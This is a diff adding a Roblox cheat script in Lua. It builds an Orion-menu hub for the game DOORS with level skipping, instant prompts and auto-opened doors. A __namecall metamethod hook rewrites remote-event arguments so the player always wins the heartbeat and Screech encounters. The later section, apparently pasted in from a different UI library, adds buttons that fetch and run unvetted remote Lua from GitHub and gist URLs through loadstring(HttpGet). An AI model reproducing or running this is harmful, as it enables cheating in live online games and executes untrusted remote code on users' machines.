+pcl.Face = Enum.NormalId.Front
+pcl.Range = 90
+pcl.Parent = game.Players.LocalPlayer.Character.Head
+pcl.Enabled = false
+
+
+CharTab:AddToggle({
+	Name = "Headlight",
+	Default = false,
+    Callback = function(Value)
+        pcl.Enabled = Value
+    end
+})
+
+GameTab:AddToggle({
+	Name = "No seek arms/obstructions",
+	Default = false,
+    Flag = "NoSeek",
+    Save = true
+})
+
+GameTab:AddToggle({
+	Name = "Instant Interact",
+	Default = false,
+    Flag = "InstantToggle",
+    Save = true
+})
+GameTab:AddButton({
+	Name = "Skip level",
+	Callback = function()
+        pcall(function()
+            local HasKey = false
+            local CurrentDoor = workspace.CurrentRooms[tostring(game:GetService("ReplicatedStorage").GameData.LatestRoom.Value)]:WaitForChild("Door")
+            for i,v in ipairs(CurrentDoor.Parent:GetDescendants()) do
+                if v.Name == "KeyObtain" then
+                    HasKey = v
+                end
+            end
+            if HasKey then
+                game.Players.LocalPlayer.Character:PivotTo(CF(HasKey.Hitbox.Position))
+                wait(0.3)
+                fireproximityprompt(HasKey.ModulePrompt,0)
+                game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
+                wait(0.3)
+                fireproximityprompt(CurrentDoor.Lock.UnlockPrompt,0)
+            end
+            if LatestRoom == 50 then
+                CurrentDoor = workspace.CurrentRooms[tostring(LatestRoom+1)]:WaitForChild("Door")
+            end
+            game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
+            wait(0.3)
+            CurrentDoor.ClientOpen:FireServer()
+        end)
+  	end    
+})
+
+GameTab:AddToggle({
+	Name = "Auto skip level",
+	Default = false,
+    Save = false,
+    Flag = "AutoSkip"
+})
+
+local AutoSkipCoro = coroutine.create(function()
+        while true do
+            task.wait()
+            pcall(function()
+            if OrionLib.Flags["AutoSkip"].Value == true and game:GetService("ReplicatedStorage").GameData.LatestRoom.Value < 100 then
+                local HasKey = false
+                local LatestRoom = game:GetService("ReplicatedStorage").GameData.LatestRoom.Value
+                local CurrentDoor = workspace.CurrentRooms[tostring(LatestRoom)]:WaitForChild("Door")
+                for i,v in ipairs(CurrentDoor.Parent:GetDescendants()) do
+                    if v.Name == "KeyObtain" then
+                        HasKey = v
+                    end
+                end
+                if HasKey then
+                    game.Players.LocalPlayer.Character:PivotTo(CF(HasKey.Hitbox.Position))
+                    task.wait(0.3)
+                    fireproximityprompt(HasKey.ModulePrompt,0)
+                    game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
+                    task.wait(0.3)
+                    fireproximityprompt(CurrentDoor.Lock.UnlockPrompt,0)
+                end
+                if LatestRoom == 50 then
+                    CurrentDoor = workspace.CurrentRooms[tostring(LatestRoom+1)]:WaitForChild("Door")
+                end
+                game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
+                task.wait(0.3)
+                CurrentDoor.ClientOpen:FireServer()
+            end
+        end)
+        end
+end)
+coroutine.resume(AutoSkipCoro)
+
+GameTab:AddButton({
+	Name = "No jumpscares",
+	Callback = function()
+        pcall(function()
+            game:GetService("ReplicatedStorage").Bricks.Jumpscare:Destroy()
+        end)
+  	end    
+})
+GameTab:AddToggle({
+	Name = "Avoid Rush/Ambush",
+	Default = false,
+    Flag = "AvoidRushToggle",
+    Save = true
+})
+GameTab:AddToggle({
+	Name = "No Screech",
+	Default = false,
+    Flag = "ScreechToggle",
+    Save = true
+})
+
+GameTab:AddToggle({
+	Name = "Always win heartbeat",
+	Default = false,
+    Flag = "HeartbeatWin",
+    Save = true
+})
+
+GameTab:AddToggle({
+	Name = "Predict chases",
+	Default = false,
+    Flag = "PredictToggle" ,
+    Save = true
+})
+GameTab:AddToggle({
+	Name = "Notify when mob spawns",
+	Default = false,
+    Flag = "MobToggle" ,
+    Save = true
+})
+GameTab:AddButton({
+	Name = "Complete breaker box minigame",
+	Callback = function()
+        game:GetService("ReplicatedStorage").Bricks.EBF:FireServer()
+  	end    
+})
+GameTab:AddButton({
+	Name = "Skip level 50",
+	Callback = function()
+        local CurrentDoor = workspace.CurrentRooms[tostring(LatestRoom+1)]:WaitForChild("Door")
+        game.Players.LocalPlayer.Character:PivotTo(CF(CurrentDoor.Door.Position))
+  	end    
+})
+GameTab:AddParagraph("Warning","You may need to open/close the panel a few times for this to work, fixing soon.")
+
+--// ok actual code starts here
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    pcall(function()
+        if game.Players.LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
+            game.Players.LocalPlayer.Character:TranslateBy(game.Players.LocalPlayer.Character.Humanoid.MoveDirection * TargetWalkspeed/50)
+        end
+    end)
+end)
+
+game:GetService("Workspace").CurrentRooms.DescendantAdded:Connect(function(descendant)
+    if OrionLib.Flags["NoSeek"].Value == true and descendant.Name == ("Seek_Arm" or "ChandelierObstruction") then
+        task.spawn(function()
+            wait()
+            descendant:Destroy()
+        end)
+    end
+end)
+
+game:GetService("ProximityPromptService").PromptButtonHoldBegan:Connect(function(prompt)
+    if OrionLib.Flags["InstantToggle"].Value == true then
+        fireproximityprompt(prompt)
+    end
+end)
+
+local old
+old = hookmetamethod(game,"__namecall",newcclosure(function(self,...)
+    local args = {...}
+    local method = getnamecallmethod()
+    
+    if tostring(self) == 'Screech' and method == "FireServer" and OrionLib.Flags["ScreechToggle"].Value == true then
+        args[1] = true
+        return old(self,unpack(args))
+    end
+    if tostring(self) == 'ClutchHeartbeat' and method == "FireServer" and OrionLib.Flags["HeartbeatWin"].Value == true then
+        args[2] = true
+        return old(self,unpack(args))
+    end
+    
+    return old(self,...)
+end))
+
+workspace.CurrentCamera.ChildAdded:Connect(function(child)
+    if child.Name == "Screech" and OrionLib.Flags["ScreechToggle"].Value == true then
+        child:Destroy()
+    end
+end)
+
+local NotificationCoroutine = coroutine.create(function()
+    LatestRoom.Changed:Connect(function()
+        if OrionLib.Flags["PredictToggle"].Value == true then
+            local n = ChaseStart.Value - LatestRoom.Value
+            if 0 < n and n < 4 then
+                OrionLib:MakeNotification({
+                    Name = "Warning!",
+                    Content = "Event in " .. tostring(n) .. " rooms.",
+                    Time = 5
+                })
+            end
+        end
+        if OrionLib.Flags["BookToggle"].Value == true then
+            if LatestRoom.Value == 50 then
+                coroutine.resume(BookCoroutine)
+            end
+        end
+        if OrionLib.Flags["FigureToggle"].Value == true then
+            if LatestRoom.Value == 50 then
+                coroutine.resume(EntityCoroutine)
+            end
+        end
+    end)
+    workspace.ChildAdded:Connect(function(inst)
+        if inst.Name == "RushMoving" and OrionLib.Flags["MobToggle"].Value == true then
+            if OrionLib.Flags["AvoidRushToggle"].Value == true then
+                OrionLib:MakeNotification({
+                    Name = "Warning!",
+                    Content = "Avoiding Rush. Please wait.",
+                    Time = 5
+                })
+                local OldPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+                local con = game:GetService("RunService").Heartbeat:Connect(function()
+                    game.Players.LocalPlayer.Character:MoveTo(OldPos + Vector3.new(0,20,0))
+                end)
+                
+                inst.Destroying:Wait()
+                con:Disconnect()
+
+                game.Players.LocalPlayer.Character:MoveTo(OldPos)
+            else
+                OrionLib:MakeNotification({
+                    Name = "OHIO!",
+                    Content = "Rush has spawned, hide!",
+                    Time = 5
+                })
+            end
+        elseif inst.Name == "AmbushMoving" and OrionLib.Flags["MobToggle"].Value == true then
+            if OrionLib.Flags["AvoidRushToggle"].Value == true then
+                OrionLib:MakeNotification({
+                    Name = "Warning!",
+                    Content = "Avoiding Ambush. Please wait.",
+                    Time = 5
+                })
+                local OldPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+                local con = game:GetService("RunService").Heartbeat:Connect(function()
+                    game.Players.LocalPlayer.Character:MoveTo(OldPos + Vector3.new(0,20,0))
+                end)
+                
+                inst.Destroying:Wait()
+                con:Disconnect()
+                
+                game.Players.LocalPlayer.Character:MoveTo(OldPos)
+            else
+                OrionLib:MakeNotification({
+                    Name = "Warning!",
+                    Content = "Ambush has spawned, hide!",
+                    Time = 5
+                })
+            end
+        end
+    end)
+end)
+
+--// ok actual code ends here
+
+local CreditsTab = Window:MakeTab({
+	Name = "Credits",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+CreditsTab:AddParagraph("Credits to","OminousVibes - (Got mo$t of the ideas from their thread, check it out! - https://v3rmillion.net/showthread.php?tid=1184088)")
+
+coroutine.resume(NotificationCoroutine)
+
+OrionLib:Init()
+
+task.wait(2)
+end)
+local Tab = Window:NewTab("PetSimX🌊")
+local Section = Tab:NewSection("PSXscripts")
+Section:NewButton("PSX jmes", "InjectsJmesScriptforPSX", function()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jmesfo0/RobloxScripts/main/psx-jmes.lua"))()
+end)
+Section:NewButton("Milk-up PSX", "InjectsAscriptForPSX", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Flxry/Main/MilkyHub/Pet%20Simulator%20X"))()
+end)
+Section:NewButton("PSXNexHUB", "injectsNexHubpsx", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/CopyReal/NexHub/main/NexHubLoader"))()
+end)
+local Tab = Window:NewTab("Tower Of Hell🚩")
+local Section = Tab:NewSection("TOHscripts")
+Section:NewButton("TowerOfHellbloxiyt", "injectsTOHscript", function()
+    loadstring(game:HttpGet("https://gist.githubusercontent.com/BloxiYT/85f97364b6367baac677e109488c9905/raw/c2972a2b892c4193509ddb2fe1ba3061435e1a8a/gistfile1.txt"))()
+end)
+Section:NewButton("TOHdarkyyware", "Injectsdarkyyware", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AndrewDarkyy/NOWAY/main/darkyyware.lua"))()
+end)
